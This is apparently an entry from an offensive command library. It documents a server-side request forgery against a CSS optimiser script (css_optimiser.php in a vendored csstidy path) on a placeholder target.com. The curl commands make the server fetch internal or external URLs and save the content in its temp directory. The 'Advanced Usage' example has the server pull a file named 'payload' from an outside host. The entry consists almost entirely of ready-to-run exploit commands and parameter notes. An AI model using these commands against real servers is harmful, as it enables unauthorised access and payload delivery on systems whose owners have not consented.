---
id: h8i9j0k1-l2m3-4567-hijk-890123456789
data: >-
  curl
  "http://target.com/apps/mail/vendor/cerdic/css-tidy/css_optimiser.php?url=http://target.com/apps/richdocuments/docs/custom.css&custom=1&template=4"
tags:
  - ssrf
  - download
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T04:08:48.578Z'
verified: false
validated: true
submitted: true
---
# curl-css-download

## Command

```bash
curl "http://target.com/apps/mail/vendor/cerdic/css-tidy/css_optimiser.php?url=http://target.com/apps/richdocuments/docs/custom.css&custom=1&template=4"
```

## Description

Downloads remote CSS data to the temp directory using SSRF with custom processing parameters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| url | Source URL | Yes |
| custom | Enable custom mode | Yes |
| template | Template ID (4 for CSS) | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/apps/mail/vendor/cerdic/css-tidy/css_optimiser.php?url=internal.css&custom=1&template=4"
```

### Advanced Usage

```bash
curl "http://target.com/apps/mail/vendor/cerdic/css-tidy/css_optimiser.php?url=http://external/payload&custom=1&template=4"
```

## Expected Output

Processed CSS output; file saved server-side in temp/.

## Related

- [[procedures/Download-Remote-Data-as-CSS]]
